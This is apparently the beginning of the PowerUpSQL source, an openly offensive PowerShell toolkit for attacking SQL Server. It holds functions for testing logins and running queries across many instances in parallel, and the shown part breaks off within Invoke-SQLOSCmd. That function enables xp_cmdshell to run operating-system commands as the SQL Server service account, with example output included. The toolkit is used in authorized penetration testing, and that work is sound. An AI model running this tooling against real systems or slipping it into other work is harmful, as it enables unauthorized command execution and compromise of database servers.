#requires -version 2
<#
        File: PowerUpSQL.ps1
        Author: Scott Sutherland (@_nullbind), NetSPI - 2016
        Major Contributors: Antti Rantasaari and Eric Gruber
        Version: 1.0.0.76
        Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
        License: BSD 3-Clause
        Required Dependencies: PowerShell v.2
        Optional Dependencies: None
#>

#########################################################################
#
#region          CORE FUNCTIONS
#
#########################################################################

# ----------------------------------
#  Get-SQLConnectionObject
# ----------------------------------
# Author: Scott Sutherland
# Reference: https://msdn.microsoft.com/en-us/library/ms188247.aspx
# Reference: https://raw.githubusercontent.com/sqlcollaborative/dbatools/master/functions/SharedFunctions.ps1
# Reference: https://blogs.msdn.microsoft.com/spike/2008/11/14/connectionstrings-mixing-usernames-and-windows-authentication-who-goes-first/
Function  Get-SQLConnectionObject
{
    <#
            .SYNOPSIS
            Creates a object for connecting to SQL Server.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Database
            Default database to connect to.
            .EXAMPLE
            PS C:\> Get-SQLConnectionObject -Username MySQLUser -Password MySQLPassword

            StatisticsEnabled                : False
            AccessToken                      :
            ConnectionString                 : Server=SQLServer1;Database=Master;User ID=MySQLUser;Password=MySQLPassword;Connection Timeout=1
            ConnectionTimeout                : 1
            Database                         : Master
            DataSource                       : SQLServer1
            PacketSize                       : 8000
            ClientConnectionId               : 00000000-0000-0000-0000-000000000000
            ServerVersion                    :
            State                            : Closed
            WorkstationId                    : SQLServer1
            Credential                       :
            FireInfoMessageEventOnUserErrors : False
            Site                             :
            Container                        :
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Dedicated Administrator Connection (DAC).')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut = 1
    )

    Begin
    {
        # Setup DAC string
        if($DAC)
        {
            $DacConn = 'ADMIN:'
        }
        else
        {
            $DacConn = ''
        }

        # Set database filter
        if(-not $Database)
        {
            $Database = 'Master'
        }
    }

    Process
    {
        # Check for instance
        if ( -not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Create connection object
        $Connection = New-Object -TypeName System.Data.SqlClient.SqlConnection

        # Set authentcation type - current windows user
        if(-not $Username){

            # Set authentication type
            $AuthenticationType = "Current Windows Credentials"

            # Set connection string
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;Connection Timeout=1"
        }
        
        # Set authentcation type - provided windows user
        if ($username -like "*\*"){
            $AuthenticationType = "Provided Windows Credentials"

            # Setup connection string 
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;uid=$Username;pwd=$Password;Connection Timeout=$TimeOut"
        }

        # Set authentcation type - provided sql login
        if (($username) -and ($username -notlike "*\*")){

            # Set authentication type
            $AuthenticationType = "Provided SQL Login"

            # Setup connection string 
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;User ID=$Username;Password=$Password;Connection Timeout=$TimeOut"
        }

        # Return the connection object
        return $Connection
    }

    End
    {
    }
}


# ----------------------------------
#  Get-SQLConnectionTest
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLConnectionTest
{
    <#
            .SYNOPSIS
            Tests if the current Windows account or provided SQL Server login can log into an SQL Server.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .EXAMPLE
            PS C:\> Get-SQLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress"
            .EXAMPLE
            PS C:\> Get-SQLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com,1433"
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTest -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')
        $null = $TblResults.Columns.Add('Status')
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Setup DAC string
        if($DAC)
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
        }
        else
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
        }

        # Attempt connection
        try
        {
            # Open connection
            $Connection.Open()

            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }

            # Add record
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Accessible')

            # Close connection
            $Connection.Close()

            # Dispose connection
            $Connection.Dispose()
        }
        catch
        {
            # Connection failed
            if(-not $SuppressVerbose)
            {
                $ErrorMessage = $_.Exception.Message
                Write-Verbose -Message "$Instance : Connection Failed."
                Write-Verbose  -Message " Error: $ErrorMessage"
            }

            # Add record
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
        }
    }

    End
    {
        # Return Results
        $TblResults
    }
}


# ----------------------------------
#  Get-SQLConnectionTestThreaded
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLConnectionTestThreaded
{
    <#
            .SYNOPSIS
            Tests if the current Windows account or provided SQL Server login can log into an SQL Server.  This version support threading using runspaces.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .PARAMETER Threads
            Number of concurrent threads.
            .EXAMPLE
            PS C:\> Get-SQLConnectionTestThreaded -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLConnectionTestThreaded -Verbose -Instance "SQLSERVER1.domain.com,1433" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose -Threads 15
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')
        $null = $TblResults.Columns.Add('Status')

        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            # Setup instance
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Setup DAC string
            if($DAC)
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
            }
            else
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
            }

            # Attempt connection
            try
            {
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Add record
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Accessible')

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose()
            }
            catch
            {
                # Connection failed

                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    #Write-Verbose  " Error: $ErrorMessage"
                }

                # Add record
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblResults
    }
}


# ----------------------------------
#  Get-SQLQuery
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLQuery
{
    <#
            .SYNOPSIS
            Executes a query on target SQL servers.This
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .PARAMETER Threads
            Number of concurrent threads.
            .PARAMETER Query
            Query to be executed on the SQL Server.
            .EXAMPLE
            PS C:\> Get-SQLQuery -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress" -Query "Select @@version" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLQuery -Verbose -Instance "SQLSERVER1.domain.com,1433" -Query "Select @@version" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLQuery -Verbose -Query "Select @@version" -Threads 15
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server query.')]
        [string]$Query,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [int]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Return error message if exists.')]
        [switch]$ReturnError
    )

    Begin
    {
        # Setup up data tables for output
        $TblQueryResults = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Setup DAC string
        if($DAC)
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -DAC -Database $Database
        }
        else
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
        }

        # Parse SQL Server instance name
        $ConnectionString = $Connection.Connectionstring
        $Instance = $ConnectionString.split(';')[0].split('=')[1]

        # Check for query
        if($Query)
        {
            # Attempt connection
            try
            {
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Setup SQL query
                $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, $Connection)

                # Grab results
                $Results = $Command.ExecuteReader()

                # Load results into data table
                $TblQueryResults.Load($Results)

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose()
            }
            catch
            {
                # Connection failed - for detail error use  Get-SQLConnectionTest
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }

                if($ReturnError)
                {
                    $ErrorMessage = $_.Exception.Message
                    #Write-Verbose  " Error: $ErrorMessage"
                }
            }
        }
        else
        {
            Write-Output -InputObject 'No query provided to Get-SQLQuery function.'
            Break
        }
    }

    End
    {
        # Return Results
        if($ReturnError)
        {
            $ErrorMessage
        }
        else
        {
            $TblQueryResults
        }
    }
}


# ----------------------------------
#  Get-SQLQueryThreaded
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLQueryThreaded
{
    <#
            .SYNOPSIS
            Executes a query on target SQL servers.This version support threading using runspaces.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .PARAMETER Threads
            Number of concurrent host threads.
            .PARAMETER Query
            Query to be executed on the SQL Server.
            .EXAMPLE
            PS C:\> Get-SQLQueryThreaded -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress" -Query "Select @@version" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLQueryThreaded -Verbose -Instance "SQLSERVER1.domain.com,1433" -Query "Select @@version" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLQueryThreaded -Verbose -Query "Select @@version" -Threads 15
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $true,
        HelpMessage = 'Query to be executed.')]
        [String]$Query,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblResults = New-Object -TypeName System.Data.DataTable

        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Setup DAC string
            if($DAC)
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
            }
            else
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
            }

            # Attempt connection
            try
            {
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Setup SQL query
                $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, $Connection)

                # Grab results
                $Results = $Command.ExecuteReader()

                # Load results into data table
                $TblResults.Load($Results)

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose()
            }
            catch
            {
                # Connection failed

                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    #Write-Verbose  " Error: $ErrorMessage"
                }

                # Add record
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblResults
    }
}

#endregion

#########################################################################
#
#region          COMMON FUNCTIONS
#
#########################################################################

# ----------------------------------
#  Invoke-SQLOSCmd
# ----------------------------------
# Author: Scott Sutherland
Function  Invoke-SQLOSCmd
{
    <#
            .SYNOPSIS
            Execute command on the operating system as the SQL Server service account using xp_cmdshell. Supports threading, raw output, and table output.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .PARAMETER Threads
            Number of concurrent threads.
            .PARAMETER Command
            Operating command to be executed on the SQL Server.
            .PARAMETER RawResults
            Just show the raw results without the computer or instance name.
            .EXAMPLE
            PS C:\> Invoke-SQLOSCmd -Verbose -Instance "SQLServer1" -Command "dir c:\windows\system32\drivers\etc\" -RawResults
            VERBOSE: Creating runspace pool and session states
            VERBOSE: SQLServer1 : Connection Success.
            VERBOSE: SQLServer1 : Connection Success.
            VERBOSE: SQLServer1 : You are a sysadmin.
            VERBOSE: SQLServer1 : Show Advanced Options is disabled.
            VERBOSE: SQLServer1 : Enabled Show Advanced Options.
            VERBOSE: SQLServer1 : xp_cmdshell is disabled.
            VERBOSE: SQLServer1 : Enabled xp_cmdshell.
            VERBOSE: SQLServer1 : Running command: dir c:\windows\system32\drivers\etc\
            VERBOSE: SQLServer1 : Disabling xp_cmdshell
            VERBOSE: SQLServer1 : Disabling Show Advanced Options
            Volume in drive C is OSDisk
            Volume Serial Number is C044-F8BC

            VERBOSE: Closing the runspace pool
            output
            ------

            Directory of c:\windows\system32\drivers\etc

            06/22/2016  09:09 AM    <DIR>          .
            06/22/2016  09:09 AM    <DIR>          ..
            09/22/2015  10:16 AM               851 hosts
            08/22/2013  10:35 AM             3,683 lmhosts.sam
            08/22/2013  08:25 AM               407 networks
            08/22/2013  08:25 AM             1,358 protocol
            08/22/2013  08:25 AM            17,463 services
            5 File(s)         23,762 bytes
            2 Dir(s)  56,438,497,280 bytes free
            .EXAMPLE
            PS C:\> Invoke-SQLOSCmd -Verbose -Instance "SQLSERVER1.domain.com,1433" -Command "whoami"
            Invoke-SQLOSCmd -Verbose -Instance "SQLServer1" -Command "whoami"
            VERBOSE: Creating runspace pool and session states
            VERBOSE: SQLServer1 : Connection Success.
            VERBOSE: SQLServer1 : Connection Success.
            VERBOSE: SQLServer1 : You are a sysadmin.
            VERBOSE: SQLServer1 : Show Advanced Options is disabled.
            VERBOSE: SQLServer1 : Enabled Show Advanced Options.
            VERBOSE: SQLServer1 : xp_cmdshell is disabled.
            VERBOSE: SQLServer1 : Enabled xp_cmdshell.
            VERBOSE: SQLServer1 : Running command: whoami
            VERBOSE: SQLServer1 : Disabling xp_cmdshell
            VERBOSE: SQLServer1 : Disabling Show Advanced Options
            VERBOSE: Closing the runspace pool

            ComputerName   Instance       CommandResults
            ------------   --------       --------------
            SQLServer1     SQLServer1     nt service\mssqlserver
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Invoke-SQLOSCmd -Verbose -Command "whoami" -Threads 5
            Get-SQLInstanceLocal | Invoke-SQLOSCmd -Verbose -Command "whoami"
            VERBOSE: Creating runspace pool and session states
            VERBOSE: SQLServer1\SQLEXPRESS : Connection Success.
            VERBOSE: SQLServer1\SQLEXPRESS : Connection Success.
            VERBOSE: SQLServer1\SQLEXPRESS : You are a sysadmin.
            VERBOSE: SQLServer1\SQLEXPRESS : Show Advanced Options is already enabled.
            VERBOSE: SQLServer1\SQLEXPRESS : xp_cmdshell is already enabled.
            VERBOSE: SQLServer1\SQLEXPRESS : Running command: whoami
            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
            VERBOSE: SQLServer1\STANDARDDEV2014 : You are a sysadmin.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Show Advanced Options is already enabled.
            VERBOSE: SQLServer1\STANDARDDEV2014 : xp_cmdshell is already enabled.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Running command: whoami
            VERBOSE: SQLServer1 : Connection Success.
            VERBOSE: SQLServer1 : Connection Success.
            VERBOSE: SQLServer1 : You are a sysadmin.
            VERBOSE: SQLServer1 : Show Advanced Options is disabled.
            VERBOSE: SQLServer1 : Enabled Show Advanced Options.
            VERBOSE: SQLServer1 : xp_cmdshell is disabled.
            VERBOSE: SQLServer1 : Enabled xp_cmdshell.
            VERBOSE: SQLServer1 : Running command: whoami
            VERBOSE: SQLServer1 : Disabling xp_cmdshell
            VERBOSE: SQLServer1 : Disabling Show Advanced Options
            VERBOSE: Closing the runspace pool

            ComputerName   Instance                       CommandResults
            ------------   --------                       --------------
            SQLServer1     SQLServer1\SQLEXPRESS          nt service\mssql$sqlexpress
            SQLServer1     SQLServer1\STANDARDDEV2014     nt authority\system
            SQLServer1     SQLServer1                     nt service\mssqlserver

    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$RawResults
    )

    Begin
    {
        # Setup data table for output
        $TblCommands = New-Object -TypeName System.Data.DataTable
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')
        $null = $TblResults.Columns.Add('CommandResults')


        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Default connection to local default instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Setup DAC string
            if($DAC)
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }

            # Attempt connection
            try
            {
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Switch to track xp_cmdshell status
                $DisableShowAdvancedOptions = 0
                $DisableXpCmdshell = 0

                # Get sysadmin status
                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

                # Check if xp_cmdshell is enabled
                if($IsSysadmin -eq 'Yes')
                {
                    Write-Verbose -Message "$Instance : You are a sysadmin."
                    $IsXpCmdshellEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'xp_cmdshell'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
                    $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."

                    # Add record
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",'No sysadmin privileges.')
                    return
                }

                # Enable show advanced options if needed
                if ($IsShowAdvancedEnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
